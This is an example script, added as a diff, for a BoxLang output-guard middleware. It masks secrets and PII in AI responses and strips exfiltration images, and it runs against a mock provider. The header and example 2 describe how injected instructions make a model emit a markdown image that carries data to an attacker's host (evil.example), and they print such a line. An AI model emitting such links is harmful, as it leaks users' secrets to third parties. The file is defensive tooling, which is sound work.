@@ -1,0 +1,150 @@
+/**
+ * Output Guard Example
+ *
+ * OutputGuardMiddleware guards what comes OUT of the model. It scrubs the assistant
+ * response BEFORE it reaches your app or the user, defending against two concrete
+ * risks that the input-side layers (sanitizer, fencing, judge) can't catch:
+ *
+ *   1. Secret / PII leakage — the model echoes an email, SSN, credit card, API key,
+ *      or private key into its reply. These are masked.
+ *   2. Data exfiltration — an injected instruction makes the model emit a data-bearing
+ *      markdown image, the classic ![x](https://evil.com?data=<secrets>) that leaks
+ *      when the response is rendered. These are stripped.
+ *
+ * It is 100% offline: regex redaction + a Luhn check for credit cards + exfil
+ * stripping via PromptSecurity. No second model, no network. Attach it to an agent
+ * (primary) or model — the way middleware is used in this module.
+ *
+ * Three actions:
+ *   - redact (default) : mask secrets + strip exfil, then let the CLEAN response through
+ *   - flag             : leave content intact, but stamp findings + log
+ *   - block            : throw BXAI.SecurityViolation when anything is found
+ *
+ * This example runs fully offline against the built-in "mock" provider, scripting
+ * responses that contain secrets and exfil markdown.
+ */
+
+import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
+
+println( "=== Output Guard ===" )
+println( "" )
+
+// Helper: run a guarded chat and report the (possibly scrubbed) answer or the block.
+function guardedChat( required any guard, required string input, required string response ) {
+	try {
+		return "ANSWER → " & aiChat( arguments.input, {}, {
+			provider       : "mock",
+			providerOptions: { responses: [ arguments.response ] },
+			middleware     : [ arguments.guard ]
+		} );
+	} catch( any e ) {
+		return "BLOCKED → " & e.message;
+	}
+}
+
+// -----------------------------------------------------------------------------
+// 1. redact (default): secrets in the response are masked before you see them
+// -----------------------------------------------------------------------------
+redactGuard = new OutputGuardMiddleware( action: "redact" )
+
+println( "--- redact: leaked secrets are masked ---" )
+println( guardedChat(
+	redactGuard,
+	"Show me the customer record",
+	"The customer's email is jane.doe@example.com, SSN 123-45-6789, card 4111111111111111."
+) )
+println( "" )
+
+// -----------------------------------------------------------------------------
+// 2. redact: a data-exfiltration markdown image is stripped
+// -----------------------------------------------------------------------------
+println( "--- redact: exfiltration markdown image is stripped ---" )
+println( guardedChat(
+	redactGuard,
+	"Summarize and cite your source",
+	"All done! ![tracking](https://evil.example/collect?data=leaked-secrets) Thanks."
+) )
+println( "" )
+
+// -----------------------------------------------------------------------------
+// 3. redact with an allowlist: trusted image hosts are kept
+// -----------------------------------------------------------------------------
+allowlistGuard = new OutputGuardMiddleware(
+	action           : "redact",
+	allowedImageHosts: [ "mysite.com" ]
+)
+
+println( "--- redact + allowlist: trusted host image is preserved ---" )
+println( guardedChat(
+	allowlistGuard,
+	"Give me the logo",
+	"Here is your logo: ![logo](https://cdn.mysite.com/logo.png)"
+) )
+println( "" )
+
+// -----------------------------------------------------------------------------
+// 4. block: any finding throws BXAI.SecurityViolation
+// -----------------------------------------------------------------------------
+blockGuard = new OutputGuardMiddleware( action: "block" )
+
+println( "--- block: a response carrying a secret is rejected ---" )
+println( guardedChat(
+	blockGuard,
+	"Print the deploy key",
+	"Sure, the AWS key is AKIAIOSFODNN7EXAMPLE."
+) )
+println( "" )
+
+// -----------------------------------------------------------------------------
+// 5. flag: content is left intact, findings are logged for later inspection
+// -----------------------------------------------------------------------------
+flagGuard = new OutputGuardMiddleware( action: "flag" )
+
+println( "--- flag: content passes through untouched, finding is logged ---" )
+println( guardedChat(
+	flagGuard,
+	"What's the contact email?",
+	"You can reach support at help@example.com."
+) )
+println( "" )
+
+// -----------------------------------------------------------------------------
+// 6. Custom redactors: a regex OR a closure for dynamic redaction
+//    A closure receives ( text, mask ) and returns the cleaned text — so you can
+//    partially mask, keep last-4 digits, call an external service, etc.
+// -----------------------------------------------------------------------------
+dynamicGuard = new OutputGuardMiddleware(
+	action         : "redact",
+	redactors      : [],   // skip the built-ins for this demo
+	customRedactors: {
+		// regex redactor: mask every match
+		"internalCode": "ACME-[0-9]+",
+		// closure redactor: keep the last 4 digits of an account number, mask the rest
+		"account"     : ( text, mask ) => reReplace( text, "[0-9]+([0-9]{4})", mask & "\1", "all" )
+	}
+)
+
+println( "--- custom redactors: regex + dynamic closure ---" )
+println( guardedChat(
+	dynamicGuard,
+	"Look up my order",
+	"Order ACME-4821 for account 987654321 is ready."
+) )
+println( "" )
+
+// -----------------------------------------------------------------------------
+// 7. Attached on an agent (the primary, recommended seam)
+// -----------------------------------------------------------------------------
+println( "--- on an agent: response secrets are redacted end-to-end ---" )
+agent = aiAgent(
+	name        : "support-agent",
+	model       : aiModel( provider: "mock", options: { providerOptions: {
+		responses: [ "Recorded SSN 123-45-6789 for the ticket." ]
+	} } ),
+	instructions: "You are a helpful support assistant.",
+	middleware  : [ new OutputGuardMiddleware( action: "redact" ) ]
+)
+println( "ANSWER → " & agent.run( "Log my details" ) )
+println( "" )
+
+println( "=== Done ===" )
